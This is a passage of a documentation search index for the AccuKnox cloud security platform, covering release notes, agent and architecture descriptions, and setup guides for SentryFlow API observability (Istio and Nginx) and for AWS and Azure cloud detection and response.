analysis to catch exposure issues early.</li> <li>Enhancements include:</li> <li>Generic Count API for consistent reporting</li> <li>API Findings surfaced directly on the Findings page for easy triage</li> </ul> <p>Together, these capabilities deliver the first stage of API Security coverage: - Automatic discovery of internal/external APIs - Inventory organization - Security signal centralization</p> <p>This gives teams an actionable map of their API attack surface and sets the stage for runtime protection in upcoming phases.</p> <p> </p>"},{"location":"getting-started/3.2-release/#7-collectors","title":"7. Collectors","text":"<ul> <li>Built-in collectors for Host Endpoint Scanning, ASPM, and AI-Security Modules.</li> <li>Accessible via Settings &gt; Collectors.</li> <li>Eliminates the need for custom scripts, plugins, or workflows across GitLab, GitHub, Nessus, etc.</li> <li>Configure and run scans from a single interface \u2014 whether using AccuKnox-deployed or self-deployed tools.</li> </ul> <p>\u2705 Streamlines setup, reduces errors, and saves time by enabling seamless configuration and deployment directly within the platform.</p> <p> </p>"},{"location":"getting-started/3.2-release/#8-hardening-policies-for-vms","title":"8. Hardening Policies for VMs","text":"<p>When onboarding VMs, recommended hardening policies can now be applied to secure them and scan for known issues.</p> <p>Access these out-of-the-box policies under Runtime Protection &gt; Policies and enforce them on your VMs for faster, stronger security.</p> <p> </p>"},{"location":"getting-started/3.2-release/#9-spire-based-onboarding-for-jobs","title":"9. SPIRE-Based Onboarding for Jobs","text":"<p>AccuKnox Jobs now support SPIRE-based authorization as a replacement for access-token based deployments.</p> <ul> <li>Once a cluster is onboarded in the UI, users can deploy jobs using the join token instead of an access token.</li> <li>This streamlines deployment and leverages existing SPIRE-based cluster authorization.</li> <li>No need to chase expiring tokens \u2014 SPIRE makes access set-and-forget with simplified access preservation.</li> </ul>"},{"location":"getting-started/accuknox-agents/","title":"AccuKnox Agents","text":"<p>We have the agent-based model for CWPP. This offers a balanced approach providing non-intrusive scanning for cloud accounts \u2013 not to mention the deep visibility for workloads using eBPF-based agents.</p> <p></p> <p>Note that we also offer a agentless model for CSPM. This is a lightweight, non-intrusive approach that provides deep visibility into cloud accounts without the need for agents.  AccuKnox\u2019s hybrid approach optimizes cloud security for diverse organizational needs.</p> <p>Let us see the various agents that are part of the AccuKnox solution.</p>"},{"location":"getting-started/accuknox-agents/#kubearmor","title":"KubeArmor","text":"<p>KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level. It operates with Linux security modules LSMs, meaning that it can work on top of any Linux platforms (such as Alpine, Ubuntu, and Container-optimized OS from Google) if Linux security modules (e.g., AppArmor, SELinux, or BPF-LSM) are enabled in the Linux Kernel. KubeArmor will use the appropriate LSMs to enforce the required policies.</p> <p></p> <p>KubeArmor allows operators to define security policies and apply them to Kubernetes. Then, KubeArmor will automatically detect the changes in security policies from Kubernetes and enforce them on the corresponding containers and nodes. If there are any violations against security policies, KubeArmor immediately generates alerts with container identities. If operators have any logging systems, it automatically sends the alerts to their systems as well.</p>"},{"location":"getting-started/accuknox-agents/#feeder-service","title":"Feeder Service","text":"<p>The feeder service sends information from the Client Cluster to the AccuKnox SaaS Control Plane. Feeder Service is an agent which runs on every node, collects telemetry/alert events from source systems &amp; messages, and emits them to Messaging Cluster for Storage &amp; Analysis. Ways in which the Feeder service communicates to the central control plane:</p> <ul> <li> <p>Directly posting messages to Kafka Topic</p> </li> <li> <p>List of topics (Each component has a separate topic name) on where the feeder service publishes feeds.</p> </li> <li> <p>Posting via a GRPC or REST API Service</p> </li> </ul> <p>All communication between Feeder and Control plane (Kafka. etc) is encrypted using TLS. Feeder Service uses a secret key from Kubernetes secrets to be applied to it when connecting to the control plane. This secret key allows the feeder to talk to the control plane and exchange data for a particular tenant-id/workspace-id. This is an API key that is generated as part of the cluster onboarding. The feeder service will self-assess some metrics and logs and send that information to the Control plane for its own health assessment for one or more components including its own (running on nodes).The Feeder Service makes it simpler to monitor the detailed communication between each entity.</p>"},{"location":"getting-started/accuknox-agents/#shared-informer-agent","title":"Shared Informer Agent","text":"<p>Shared Informer Agent watches all the changes occurring in Kubernetes entities such as Pods, Nodes, Namespaces, Endpoints, and Services.</p> <ul> <li> <p>Any changes to an entity can be easily tracked by the Shared Informer Agent such as the Creation of an entity, the update of an entity, and if any entity has been deleted and as soon as the changes occur to the entities, the Shared Informer Agent pushes the information to the backend.</p> </li> <li> <p>The Shared Informant Agent makes it simpler to track and manage all of the entities that are present in Kubernetes as well as see changes in entities as they occur in real-time.</p> </li> </ul>"},{"location":"getting-started/accuknox-agents/#policy-enforcement-agent","title":"Policy Enforcement Agent","text":"<p>AccuKnox\u2019s Policy Enforcement Agent enforces the policies by leveraging KubeArmor and Cillium. Policy Enforcement Agent not only keeps the track of the policies but is capable of doing tasks such as applying policies, denying policies, updating policies, and deleting the policies.</p> <ul> <li> <p>The policy enforcement agent encrypts and decrypts the policies while handing them to and from the policy provider service. It reads the specification of the policies and provides back to the policy provider service.</p> </li> <li> <p>All of the changes done to the policy can be tracked granularly with the help of the Policy Enforcement Agent and Policy Gitops Flow which helps with version control and robust management of the security policies.</p> </li> </ul>"},{"location":"getting-started/accuknox-agents/#discovery-engine","title":"Discovery Engine","text":"<p>AccuKnox policy enforcement engine based on KubeArmor is very flexible and powerful. However, these policy engines must be fed with policies. With 10s or 100s of pods and workloads running in a cluster, it is insanely difficult to handcraft such policies. AccuKnox policy auto-discovery engine leverages the pod visibility provided by KubeArmor to auto-generate network and system policies.</p> <p></p> <p>AccuKnox\u2019s Runtime security solution is able to provide full visibility into all of these application interactions with the host kernel and provide the ability to filter or restrict specific actions at runtime.</p> <p>With AccuKnox you can automatically discover the application interaction and network interaction (as described below) in the form of policy as code subsequently these policies can be audited or enforced at runtime giving you the ability to restrict specific behaviors of the application.</p> <p>For example, you could have a policy that states the following:</p> <ul> <li> <p>Pod A cannot access the/etc/bin folder</p> </li> <li> <p>Pod B cannot initiate ptrace i.e. trace the execution of other processes.</p> </li> <li> <p>Pod C cannot communicate to a remote TCP server running on port 5000.</p> </li> </ul> <p>This list can be as exhaustive as you like, and these policies are enforced within the kernel using kernel primitives and technologies as listed below:</p> <p>Network Security using eBPF</p> <ul> <li> <p>Network runtime protection in the form of L3, L4, and L7 rules using identity (x509 certificates or K8s labels) for your K8s workloads. In K8s policies, this is implemented as a native K8s networkpolicy object.</p> </li> <li> <p>For Virtual Machine workloads, labels are used to provide host-level network policies for L3, L4, and L7.</p> </li> </ul> <p>Application security using Linux Security Modules (LSM) / KubeArmor</p> <ul> <li> <p>The Linux Security Module (LSM) framework provides a mechanism for various security checks to be hooked by new kernel extensions. It denies access to essential kernel objects, such as files, inodes, task structures, credentials, and inter-process communication objects.</p> </li> <li> <p>AccuKnox supports AppArmor, SELinux and BPFLSM as of today for its enforcement engine at runtime.</p> </li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"getting-started/accuknox-arch/","title":"AccuKnox Enterprise Architecture","text":"<p>AccuKnox's Cloud-Native Application Protection Platform (CNAPP) offers a unified AppSec + CloudSec solution, integrating modules like ASPM, CSPM, CWPP, KIEM, and GRC. This architecture ensures comprehensive security across the software development lifecycle.</p>"},{"location":"getting-started/accuknox-arch/#core-components","title":"Core Components","text":""},{"location":"getting-started/accuknox-arch/#control-plane-architecture","title":"Control Plane Architecture","text":"<ul> <li>Microservices:<ul> <li>Divy: Handles API requests.</li> <li>Celery: Manages asynchronous tasks.</li> <li>Kueue: Schedules Kubernetes-native jobs.</li> </ul> </li> <li>Parser Jobs: Process asset and findings data, updating databases accordingly.</li> <li>Alerts &amp; Telemetry: Ingested via RabbitMQ, processed for real-time insights.</li> <li>Secure Onboarding: Utilizes SPIFFE-based control plane for cluster onboarding.</li> <li>Storage/Databases:<ul> <li>RDS: Stores CSPM, KSPM, and ASPM data.</li> <li>MongoDB: Handles streaming telemetry.</li> <li>Neo4j: Manages metadata for KIEM.</li> </ul> </li> <li>Integrations: Interfaces with SIEM tools (e.g., Splunk, Rsyslog) and ticketing systems (e.g., JIRA, Slack).</li> </ul>"},{"location":"getting-started/accuknox-arch/#control-plane-architecture_1","title":"Control Plane Architecture","text":"<p>Key Components</p> <ol> <li>Playbook job scheduling: Microservices (Divy), Kueue scheduler, Celery tasks</li> <li>Parser jobs for asset + findings database</li> <li>Alerts and telemetry handling via RabbitMQ</li> <li>SPIFFE-based secure cluster onboarding</li> <li>Storage layer: RDS, MongoDB, Neo4j</li> <li>External integrations &amp; triggers handling</li> </ol>"},{"location":"getting-started/accuknox-arch/#cloud-architecture","title":"Cloud Architecture","text":"<ul> <li>SaaS and On-Prem support identical services (except AskADA AI Copilot \u2013 SaaS only)</li> <li>Tenant-level feature control</li> <li>Models:<ol> <li>SaaS: AWS-managed (Aurora, S3)</li> <li>On-Prem: Full in-cluster setup (for air-gapped environments)</li> <li>Externalized: Uses customer DB/storage</li> </ol> </li> </ul>"},{"location":"getting-started/accuknox-arch/#externalized-storage-architecture","title":"Externalized Storage Architecture","text":"<ul> <li>Supports deployments with customer-managed storage</li> <li>Enables hybrid cloud use cases</li> <li>Flexible DB integration (e.g., existing RDS, MongoDB, etc.)</li> </ul>"},{"location":"getting-started/accuknox-arch/#on-premises-deployment-architecture","title":"On-Premises Deployment Architecture","text":"<ul> <li>K8s-native deployment</li> <li>No reliance on AWS managed services</li> <li>Designed for high-security &amp; compliance environments</li> </ul> <p>Deployment Details \u2192</p>"},{"location":"getting-started/accuknox-arch/#scaling-considerations","title":"Scaling Considerations","text":""},{"location":"getting-started/accuknox-arch/#key-choke-points","title":"Key Choke Points","text":"<ol> <li>Playbook Jobs: One AWS account = 272 jobs across regions<ul> <li>Kueue ensures tenant-aware resource allocation</li> </ul> </li> <li>Parser Jobs: Celery tasks parse reports &amp; update DB</li> <li>Telemetry Overload: Managed via thresholds &amp; redirection to SIEM</li> </ol>"},{"location":"getting-started/accuknox-arch/#noisy-neighbor-mitigation","title":"Noisy Neighbor Mitigation","text":"<ul> <li>Celery replicated per tenant (currently manual)</li> <li>Kueue isolates playbook jobs per tenant</li> <li>RMQ overload handled by telemetry offload</li> </ul>"},{"location":"getting-started/accuknox-arch/#log-data-storage","title":"Log &amp; Data Storage","text":"<ul> <li>RDS: CSPM, KSPM, ASPM (per-tenant tables)</li> <li>MongoDB: Telemetry logs (per-tenant collections)</li> <li>Neo4j: GraphDB for metadata (KIEM), expanding to assets/findings in v3.0</li> </ul>"},{"location":"getting-started/accuknox-arch/#customer-data-flow","title":"Customer Data Flow","text":"<ol> <li>Playbook execution (on-prem or SaaS)</li> <li>Report generated (assets/findings JSON)</li> <li>Sent to control plane via Artifact API (token-based)</li> <li>Saved in S3 + Celery task triggered</li> <li>Celery pulls from S3 and parses</li> <li>DB + Graph updated</li> <li>UI fetches via Divy APIs</li> </ol>"},{"location":"getting-started/accuknox-arch/#rules-engine-architecture","title":"Rules Engine Architecture","text":"<ul> <li>Parser emits events \u2192 Rules Engine evaluates</li> <li>Tenant-specific rule specs evaluated</li> <li>Actions (e.g., notifications, tickets) sent as Celery tasks</li> <li>Fully asynchronous, scalable via queues</li> </ul>"},{"location":"getting-started/accuknox-arch/#integrations-architecture","title":"Integrations Architecture","text":"<ul> <li>CLI-based: TruffleHog, Sonarqube, Trivy, Zap, Kubebench</li> <li>API-based: Checkmarx, Nessus</li> <li>SIEM: One-way push (e.g., Splunk, Sentinel)</li> <li>Ticketing: Bidirectional (e.g., Jira, ServiceNow)</li> </ul> <p>Integration Timelines</p> <ul> <li>CLI-based: 1 sprint</li> <li>API-based: 2\u20133 weeks</li> <li>SIEM: 1 sprint</li> <li>Ticketing: 3\u20135 sprints</li> </ul> <p>Explore Integrations \u2192</p>"},{"location":"getting-started/accuknox-arch/#compliance-frameworks","title":"Compliance Frameworks","text":"<p>Supports over 30 regulatory standards, including:</p> <ul> <li>General: ISO 27001, PCI DSS, SOC2.</li> <li>Industry-Specific: HIPAA, GDPR.</li> </ul>"},{"location":"getting-started/accuknox-arch/#additional-resources","title":"Additional Resources","text":"<ul> <li>Deployment Models</li> <li>Integrations Playbook</li> <li>Telemetry Logs</li> <li>On-Prem Installation Guide</li> </ul> <p>Info</p> <p>AccuKnox offers rapid protection for Kubernetes and other cloud workloads using Kernel Native Primitives like AppArmor, SELinux, and eBPF. For assistance in planning your cloud security strategy, feel free to reach out.</p> <p>SCHEDULE DEMO</p>"},{"location":"getting-started/api-istio/","title":"Traffic Connector for Istio","text":"<p>API Traffic Connectors enable monitoring of API traffic for observability and security insights.</p> <p>This guide provides a step-by-step process to integrate SentryFlow with Istio, aimed at enhancing API observability. It includes detailed commands for each step along with their explanations.</p> <p>SentryFlow makes use of following to provide visibility into API calls:</p> <ul> <li>Envoy Wasm Filter</li> <li>Istio Wasm Plugin</li> <li>Istio EnvoyFilter</li> </ul>"},{"location":"getting-started/api-istio/#prerequisites","title":"Prerequisites","text":"<ul> <li>Deploy Istio service mesh. Follow this to deploy it if you've not   deployed.</li> <li>Enable the envoy proxy injection by labeling the namespace in which you'll deploy your workloads:   <pre><code>kubectl label ns &lt;namespace_name&gt; istio-injection=enabled\n</code></pre></li> </ul>"},{"location":"getting-started/api-istio/#how-to","title":"How To","text":"<p>To Observe API calls of your workloads running on top of Istio Service Mesh in Kubernetes environment, follow the below steps:</p> <ol> <li>Download SentryFlow manifest file</li> </ol> <pre><code>curl -sO https://raw.githubusercontent.com/5GSEC/SentryFlow/refs/heads/main/deployments/sentryflow.yaml\n</code></pre> <ol> <li>Update the <code>.receivers</code> configuration in <code>sentryflow</code> configmap as    follows:</li> </ol> <pre><code>filters:\n  server:\n    port: 8081\n\n  # Envoy filter is required for `istio-sidecar` service-mesh receiver.\n  # Leave it as it is unless you want to use your filter.\n  envoy:\n    uri: 5gsec/sentryflow-httpfilter:v0.1\n\nreceivers:\n  serviceMeshes:\n    - name: istio-sidecar # SentryFlow makes use of `name` to configure receivers. DON'T CHANGE IT.\n      namespace: istio-system # Kubernetes namespace in which you've deployed Istio.\n  ...\n</code></pre> <ol> <li>Apply the updated manifest file:</li> </ol> <pre><code>kubectl apply -f sentryflow.yaml\n</code></pre> <ol> <li> <p>Trigger API calls to generate traffic.</p> </li> <li> <p>Use SentryFlow log client to see the API Events.</p> </li> </ol>"},{"location":"getting-started/api-k8s/","title":"Deploying SentryFlow","text":"<p>This guide provides a step-by-step process for deploying SentryFlow in a Kubernetes environment, aimed at enhancing API observability. It includes detailed commands for each step along with their explanations.</p> <p>Note: SentryFlow is currently in the early stages of development. Please be aware that the information provided here may become outdated or change without notice.</p>"},{"location":"getting-started/api-k8s/#1-prerequisites","title":"1. Prerequisites","text":"<ul> <li>A Kubernetes cluster running version 1.28 or later.</li> <li>kubectl version 1.28 or later.</li> </ul>"},{"location":"getting-started/api-k8s/#2-deploying-sentryflow","title":"2. Deploying SentryFlow","text":"<p>Configure SentryFlow receiver by following this. Then deploy updated SentryFlow manifest by following <code>kubectl</code> command:</p> <pre><code>kubectl apply -f sentryflow.yaml\n</code></pre> <p>This will create a namespace named <code>sentryflow</code> and will deploy the necessary Kubernetes resources.</p> <p>Then, check if SentryFlow is up and running by:</p> <pre><code>$ kubectl -n sentryflow get pods\nNAME                         READY   STATUS    RESTARTS   AGE\nsentryflow-cff887bbd-rljm7   1/1     Running   0          73s\n</code></pre>"},{"location":"getting-started/api-k8s/#3-viewing-captured-api-access-events-clients","title":"3. Viewing Captured API Access Events Clients","text":"<p>SentryFlow has now been deployed in the cluster. In addition, SentryFlow exports API access events through <code>gRPC</code>.</p> <p>You can use <code>sfctl</code> the SentryFlow client to view or filter captured API access events</p> <pre><code>$ sfctl event\n{\"level\":\"INFO\",\"timestamp\":\"2025-01-08T18:15:31.720+0530\",\"caller\":\"apievent/common.go:165\",\"msg\":\"starting API Events streaming\"}\n{\"level\":\"INFO\",\"timestamp\":\"2025-01-08T18:15:31.771+0530\",\"caller\":\"apievent/common.go:171\",\"msg\":\"started API Events streaming\"}\n# API Access Events\n{\"metadata\":{\"context_id\":9,\"timestamp\":1736340391,\"istio_version\":\"1.24.1\",\"mesh_id\":\"cluster.local\",\"node_name\":\"kind-control-plane\"},\"source\":{\"name\":\"server-c7669846-w5v8m\",\"namespace\":\"default\",\"ip\":\"10.244.0.8\",\"port\":57754},\"destination\":{\"namespace\":\"sentryflow\",\"ip\":\"10.96.79.211\",\"port\":9999},\"request\":{\"headers\":{\":authority\":\"sentryflow.sentryflow:9999\",\":method\":\"HEAD\",\":path\":\"/\",\":scheme\":\"http\",\"accept\":\"*/*\",\"user-agent\":\"curl/7.88.1\",\"x-forwarded-proto\":\"http\",\"x-request-id\":\"9ff1f0fb-adca-4cbb-bfbb-7927d5aa02ae\"}},\"response\":{\"headers\":{\":status\":\"404\",\"content-length\":\"19\",\"content-type\":\"text/plain; charset=utf-8\",\"date\":\"Wed, 08 Jan 2025 12:46:31 GMT\",\"x-content-type-options\":\"nosniff\"}},\"protocol\":\"HTTP/1.1\"}\n...\n</code></pre>"},{"location":"getting-started/api-k8s/#filter-api-events-based-on-some-response-status-code","title":"Filter API Events based on some Response Status Code","text":"<pre><code>$ sfctl event filter --status \"4xx\"\n{\"level\":\"INFO\",\"timestamp\":\"2025-01-08T18:20:37.096+0530\",\"caller\":\"apievent/common.go:165\",\"msg\":\"starting API Events streaming\"}\n{\"level\":\"INFO\",\"timestamp\":\"2025-01-08T18:20:37.151+0530\",\"caller\":\"apievent/common.go:171\",\"msg\":\"started API Events streaming\"}\n# API Access Events\n{\"metadata\":{\"context_id\":10,\"timestamp\":1736340639,\"istio_version\":\"1.24.1\",\"mesh_id\":\"cluster.local\",\"node_name\":\"kind-control-plane\"},\"source\":{\"name\":\"server-c7669846-w5v8m\",\"namespace\":\"default\",\"ip\":\"10.244.0.8\",\"port\":37154},\"destination\":{\"namespace\":\"sentryflow\",\"ip\":\"10.96.79.211\",\"port\":9999},\"request\":{\"headers\":{\":authority\":\"sentryflow.sentryflow:9999\",\":method\":\"HEAD\",\":path\":\"/\",\":scheme\":\"http\",\"accept\":\"*/*\",\"user-agent\":\"curl/7.88.1\",\"x-forwarded-proto\":\"http\",\"x-request-id\":\"e20a1002-09d1-4f3f-936e-ce688652ea4d\"}},\"response\":{\"headers\":{\":status\":\"404\",\"content-length\":\"19\",\"content-type\":\"text/plain; charset=utf-8\",\"date\":\"Wed, 08 Jan 2025 12:50:39 GMT\",\"x-content-type-options\":\"nosniff\"}},\"protocol\":\"HTTP/1.1\"}\n</code></pre> <p>For more info check this.</p>"},{"location":"getting-started/api-nginx/","title":"Traffic Connector for Nginx","text":"<p>API Traffic Connectors enable monitoring of API traffic for observability and security insights.</p> <p>This guide provides a step-by-step process to integrate SentryFlow with Nginx Inc. Ingress Controller, aimed at enhancing API observability. It includes detailed commands for each step along with their explanations.</p> <p>SentryFlow make use of following to provide visibility into API calls:</p> <ul> <li>Nginx njs module.</li> <li>Njs filter.</li> </ul>"},{"location":"getting-started/api-nginx/#prerequisites","title":"Prerequisites","text":"<ul> <li>Nginx Inc. Ingress Controller.   Follow this to deploy it.</li> </ul>"},{"location":"getting-started/api-nginx/#how-to","title":"How To","text":"<p>To Observe API calls of your workloads served by Nginx inc. ingress controller in Kubernetes environment, follow the below steps:</p> <ol> <li>Create the following configmap in the same namespace as ingress controller.</li> </ol> <pre><code>cat &lt;&lt;EOF | kubectl apply -f -\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: sentryflow-nginx-inc\n  namespace: &lt;ingress-controller-namespace&gt;\ndata:\n  sentryflow.js: |\n    const DEFAULT_KEY = \"sentryFlow\";\n    const ResStatusKey = \":status\"\n    const MAX_BODY_SIZE = 1_000_000; // 1 MB\n\n    function requestHandler(r, data, flags) {\n        r.sendBuffer(data, flags);\n        r.done();\n\n        let responseBody = \"\"\n        try {\n            responseBody = new TextDecoder(\"utf-8\")\n                .decode(new Uint8Array(data));\n        } catch (error) {\n            r.error(`failed to decode data, error: ${error}`)\n        }\n\n        if (responseBody.length &gt; MAX_BODY_SIZE) {\n            responseBody = \"\"\n        }\n\n        let apiEvent = {\n            \"metadata\": {\n                \"timestamp\": Date.parse(r.variables.time_iso8601.split(\"+\")[0]) / 1000,\n                \"receiver_name\": \"nginx\",\n                \"receiver_version\": ngx.version,\n            },\n            \"source\": {\n                \"ip\": r.remoteAddress,\n                \"port\": r.variables.remote_port,\n            },\n            \"destination\": {\n                \"ip\": r.variables.server_addr,\n                \"port\": r.variables.server_port,\n            },\n            \"request\": {\n                \"headers\": {},\n                \"body\": r.requestText || \"\",\n            },\n            \"response\": {\n                \"headers\": {},\n                \"body\": responseBody,\n            },\n            \"protocol\": r.variables.server_protocol,\n        };\n\n        for (const header in r.headersIn) {\n            apiEvent.request.headers[header] = r.headersIn[header];\n        }\n\n        apiEvent.request.headers[\":scheme\"] = r.variables.scheme\n        apiEvent.request.headers[\":path\"] = r.uri\n        apiEvent.request.headers[\":method\"] = r.variables.request_method\n\n        apiEvent.request.headers[\"body_bytes_sent\"] = r.variables.body_bytes_sent\n\n        apiEvent.request.headers[\"request_length\"] = r.variables.request_length\n\n        apiEvent.request.headers[\"request_time\"] = r.variables.request_time\n\n        apiEvent.request.headers[\"query\"] = r.variables.query_string\n\n        for (const header in r.headersOut) {\n            apiEvent.response.headers[header] = r.headersOut[header];\n        }\n        apiEvent.response.headers[ResStatusKey] = r.variables.status\n\n        ngx.shared.apievents.set(DEFAULT_KEY, JSON.stringify(apiEvent));\n    }\n\n    async function dispatchHttpCall(r) {\n        try {\n            let apiEvent = ngx.shared.apievents.get(DEFAULT_KEY);\n            await r.subrequest(\"/sentryflow\", {\n                method: \"POST\", body: apiEvent, detached: true\n            })\n        } catch (error) {\n            r.error(`failed to dispatch HTTP call to SentryFlow, error: ${error}`)\n            return;\n        } finally {\n            ngx.shared.apievents.clear();\n        }\n\n        r.return(200, \"OK\");\n    }\n\n    export default {requestHandler, dispatchHttpCall};\nEOF\n</code></pre> <ol> <li>Add the following volume and volume-mount in ingress controller deployment:</li> </ol> <pre><code>...\nvolumes:\n  - name: sentryflow-nginx-inc\n    configMap:\n      name: sentryflow-nginx-inc\n...\n...\nvolumeMounts:\n  - mountPath: /etc/nginx/njs/sentryflow.js\n    name: sentryflow-nginx-inc\n    subPath: sentryflow.js\n</code></pre> <ol> <li>Update ingress controller configmap as follows:</li> </ol> <pre><code>...\ndata:\n  http-snippets: |\n    js_path \"/etc/nginx/njs/\";\n    subrequest_output_buffer_size 8k;\n    js_shared_dict_zone zone=apievents:1M timeout=300s evict;\n    js_import main from sentryflow.js;\n  location-snippets: |\n    js_body_filter main.requestHandler buffer_type=buffer;\n    mirror      /mirror_request;\n    mirror_request_body on;\n  server-snippets: |\n    location /mirror_request {\n      internal;\n      js_content main.dispatchHttpCall;\n    }\n    location /sentryflow {\n      internal;\n      # Update SentryFlow URL with path to ingest access logs if required.\n      proxy_pass http://sentryflow.sentryflow:8081/api/v1/events;\n      proxy_method      POST;\n      proxy_set_header accept \"application/json\";\n      proxy_set_header Content-Type \"application/json\";\n    }\n</code></pre> <ol> <li>Download SentryFlow manifest file</li> </ol> <pre><code>curl -sO https://raw.githubusercontent.com/5GSEC/SentryFlow/refs/heads/main/deployments/sentryflow.yaml\n</code></pre> <ol> <li>Update the <code>.receivers</code> configuration in <code>sentryflow</code> configmap as    follows:</li> </ol> <pre><code>filters:\n  server:\n    port: 8081\n  # Following is required for `nginx-inc-ingress-controller` receiver.  \n  nginxIngress:\n    deploymentName: &lt;nginx-ingress-controller-deploy-name&gt;\n    configMapName: &lt;nginx-ingress-configmap-name&gt;\n    sentryFlowNjsConfigMapName: &lt;sentryflow-nginx-inc-configmap-name&gt;\n\nreceivers:\n  others:\n    - name: nginx-inc-ingress-controller # SentryFlow makes use of `name` to configure receivers. DON'T CHANGE IT.\n      namespace: &lt;ingress-controller-namespace&gt; # Kubernetes namespace in which you've deployed the ingress controller.\n  ...\n</code></pre> <ol> <li>Deploy SentryFlow</li> </ol> <pre><code>kubectl apply -f sentryflow.yaml\n</code></pre> <ol> <li> <p>Trigger API calls to generate traffic.</p> </li> <li> <p>Use SentryFlow log client to see the API Events.</p> </li> </ol>"},{"location":"getting-started/api-overview/","title":"API Security Module Overview","text":"<p>The API Security module provides deep visibility and continuous risk assessment for your APIs by analyzing live traffic, identifying unknown endpoints, and highlighting potential security exposures. It is designed to help teams reduce API attack surface, maintain compliance, and strengthen their API posture across environments.</p>"},{"location":"getting-started/api-overview/#key-features","title":"Key Features","text":""},{"location":"getting-started/api-overview/#real-time-api-inventory","title":"\ud83d\udcca Real-Time API Inventory","text":"<p>Once enabled, this module automatically builds a comprehensive API Inventory by observing real-time traffic through supported connectors. APIs are categorized based on various attributes:</p> <ul> <li>Authentication Status: Authenticated vs Unauthenticated</li> <li>Exposure Level: Internal vs External</li> <li>Data Sensitivity: Detection of PII, tokens, credentials, etc.</li> </ul> <p>Each API is assigned a risk score based on:</p> <ul> <li>Traffic behavior</li> <li>Exposure patterns</li> <li>Sensitive data indicators</li> </ul>"},{"location":"getting-started/api-overview/#continuous-risk-detection","title":"\ud83d\udd0d Continuous Risk Detection","text":"<p>The system continuously detects and classifies risky APIs using advanced traffic analysis, including:</p> <ul> <li>Shadow APIs: Endpoints observed in traffic but not listed in specifications or documentation.</li> <li>Zombie APIs: Deprecated or outdated APIs still receiving traffic and remaining accessible.</li> <li>Orphan APIs: APIs with no clear ownership, often overlooked in governance and vulnerability scans.</li> </ul>"},{"location":"getting-started/api-overview/#logical-grouping","title":"\ud83d\uddc2 Logical Grouping","text":"<p>To support better manageability and analysis, APIs can be logically grouped based on different parameters. This helps teams efficiently track and manage critical APIs.</p>"},{"location":"getting-started/aws-cdr/","title":"AccuKnox CDR for AWS \u2013 Deployment &amp; Setup Guide","text":"<p>Remediation Setup</p> <p>For remediation setup for AWS, Azure and GCP CDR please refer to the following links:</p> <ul> <li>Remediate Alerts</li> </ul>"},{"location":"getting-started/aws-cdr/#introduction","title":"Introduction","text":"<p>Accuknox CDR for AWS is deployed using CloudFormation scripts, the script deploys the following resources:</p> Resource Purpose S3 bucket Stores Cloudtrail logs CloudTrail Trail Provides a record of user activity and API calls within an AWS account Lambda function Pushes CloudTrail logs to AccuKnox <p>If you already have an S3 bucket containing cloudTrail Trail logs we will provide you with a CloudFormation script to use the already existent bucket.</p> <p>The CloudFormation script will be provided to you by AccuKnox team in the onboarding phase.</p> <p></p>"},{"location":"getting-started/aws-cdr/#prerequisites","title":"Prerequisites","text":"<p>Before deploying the CloudFormation scripts the following parameters are required:</p> Parameter Purpose Provided by AccuKnox BucketName The name of the S3 bucket to be created by the script TrailName The name of CloudTrail Trail AccuknoxSIEMUsername AccuKnox SIEM ingestion user AccuKnoxSIEMPassword AccuKnox SIEM ingestion password AccuKnoxSIEMHost AccuKnox SIEM instance AccuKnoxSIEMPort AccuKnox SIEM instance port AccuKnoxSIEMIndexName AccuKnox SIEM index name AccuKnoxSIEMExporterImage Accuknox SIEM exporter Image   Infered during the setup phase <p>The ECR repository for <code>AccuKnoxSIEMExporterImage</code> needs to be created in AWS. The image will be pushed in the next step.</p>"},{"location":"getting-started/aws-cdr/#setup","title":"Setup","text":"<p>To setup the integration please follow the steps below</p>"},{"location":"getting-started/aws-cdr/#step-1-lambda-docker-container","title":"Step 1: Lambda docker container","text":"<p>Before running the CloudFormation script you need to push <code>AccuKnox SIEM exporter Image</code> to your private ECR registry in the same region you are deploying the CloudFormation in. This image is required by the lambda function.</p> <p>We assume that you are logged in to your ECR instance.</p> <p>Please set the values of <code>AWS_ACCOUNT_ID</code> and <code>AWS_REGION</code> before running the script</p> <pre><code>TAG=\"v1.0.4\"\nAWS_ACCOUNT_ID=\"&lt;aws_account_id&gt;\"\nAWS_REGION=\"&lt;aws_region&gt;\"\nAccuKnoxSIEMExporterImage=\"$AWS_ACCOUNT_ID.dkr.ecr.$AWS_REGION.amazonaws.com/default/accuknox-siem-cloudtrail:$TAG\"\n\ndocker pull \"public.ecr.aws/k9v9d5v2/accuknox-siem-cloudtrail:$TAG\"\ndocker tag \"public.ecr.aws/k9v9d5v2/accuknox-siem-cloudtrail:$TAG\" \"$AccuKnoxSIEMExporterImage\"\ndocker push \"$AccuKnoxSIEMExporterImage\"\n\necho \"AccuKnoxSIEMExporterImage=$AccuKnoxSIEMExporterImage\"\n</code></pre> <p>Important</p> <p>The value of <code>AccuKnoxSIEMExporterImage</code> is printed at the end of the script, please save it as it is needed in the next step</p>"},{"location":"getting-started/aws-cdr/#step-2-cloudformation-script","title":"Step 2: CloudFormation Script","text":"<p>In this step we assume that you have an AWS console access and have already stored the CloudFormation script share by AccuKnox in an S3 bucket.</p> <ol> <li>Create a stack using the script that you have uploaded in the S3 bucket</li> </ol> <p> 2. Configure the stack name and parameters then deploy</p> <p> 3. Check that the stack is successfully deployed </p>"},{"location":"getting-started/aws-cdr/#next-steps","title":"Next Steps","text":"<p>Now the integration is completed and you should start seeing alerts in AccuKnox SaaS as they araise.</p>"},{"location":"getting-started/azure-cdr/","title":"AccuKnox CDR for Azure \u2013 Deployment &amp; Setup Guide","text":"<p>Remediation Setup</p> <p>For remediation setup for AWS, Azure and GCP CDR please refer to the following links:</p> <ul> <li>Remediate Alerts</li> </ul>"},{"location":"getting-started/azure-cdr/#introduction","title":"Introduction","text":"<p>AccuKnox CDR for Azure can be deployed using a Terraform configuration. The configuration deploys the following resources:</p> Resource Purpose EventHub Namespace Contains the EventHub EventHub Receives messages from the ActivityLog EventHub Authorization Rule \"activity_logs\" Allows ActivityLog to publish messages to the EventHub EventHub Authorization Rule \"logstash\" Allows Logstash to subscribe to the EventHub messages <p>The Terraform configuration will be provided to you by the AccuKnox team in the onboarding phase.</p> <p></p>"},{"location":"getting-started/azure-cdr/#setup","title":"Setup","text":"<p>To setup the integration please follow the steps 